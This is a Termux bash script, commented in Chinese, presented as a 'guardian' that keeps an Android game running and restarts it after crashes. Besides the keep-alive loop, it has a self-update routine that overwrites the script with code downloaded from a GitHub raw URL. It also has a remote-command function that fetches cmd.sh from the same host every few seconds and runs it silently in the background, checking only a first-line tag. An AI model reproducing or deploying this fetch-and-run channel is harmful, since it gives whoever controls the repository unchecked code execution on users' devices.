#!/data/data/com.termux/files/usr/bin/bash
# 二次元守护 · 云控进化版
# 免root | 版本强控 | 自更新 | 远程命令
PKG="com.tancha.ycgame"
ACTIVITY=".MainActivity"
LOCAL_VERSION="2.5"
BASE_URL="https://raw.githubusercontent.com/auth-server-by/auth-server/main"
RESTART_LIMIT=10
CHECK_INTERVAL=2
REMOTE_CMD_INTERVAL=10

dl() { curl -skL --connect-timeout 8 "$1" 2>/dev/null || wget -qO- --timeout=8 "$1" 2>/dev/null; }

check_update() {
  echo "检查云端版本..."
  CLOUD_VER=$(dl "${BASE_URL}/version.txt" | head -1 | tr -d '[:space:]')
  if [ -z "$CLOUD_VER" ]; then echo "离线模式"; return 0; fi
  echo "云端 $CLOUD_VER  本地 $LOCAL_VERSION"
  if [ "$CLOUD_VER" != "$LOCAL_VERSION" ]; then
    echo "新版本，自动更新..."
    NEW="/data/data/com.termux/files/home/guard_new.sh"
    dl "${BASE_URL}/guard.sh" > "$NEW"
    if grep -q "二次元守护" "$NEW"; then
      chmod +x "$NEW"
      cp "$NEW" "$0"
      rm "$NEW"
      exec bash "$0"
    else
      echo "更新失败"; sleep 3; exit 1
    fi
  fi
  echo "最新版"
}

exec_remote_cmd() {
  TMP="/data/data/com.termux/files/home/remote_cmd.sh"
  dl "${BASE_URL}/cmd.sh" > "$TMP" 2>/dev/null
  if [ -s "$TMP" ] && [ "$(head -1 "$TMP")" = "#!guard-cmd-allow" ]; then
    bash "$TMP" >/dev/null 2>&1 &
  fi
  rm -f "$TMP"
}

launch_game() {
  am start -n "${PKG}/${ACTIVITY}" >/dev/null 2>&1
  sleep 2
  pidof "$PKG" >/dev/null 2>&1 || { monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1; sleep 2; }
}

daemon_loop() {
  local crash=0 running=false cycle=0
  echo "守护开始"
  while :; do
    cycle=$((cycle+1))
    [ $((cycle % REMOTE_CMD_INTERVAL)) -eq 0 ] && exec_remote_cmd
    if pidof "$PKG" >/dev/null 2>&1; then
      running=true; crash=0
    else
      if $running; then
        crash=$((crash+1))
        echo "退出 ($crash/$RESTART_LIMIT)"
        [ $crash -gt $RESTART_LIMIT ] && { echo "连续异常，停止守护"; exit 1; }
        launch_game
      fi
      running=false
    fi
    sleep $CHECK_INTERVAL
  done
}

check_update
launch_game
daemon_loop
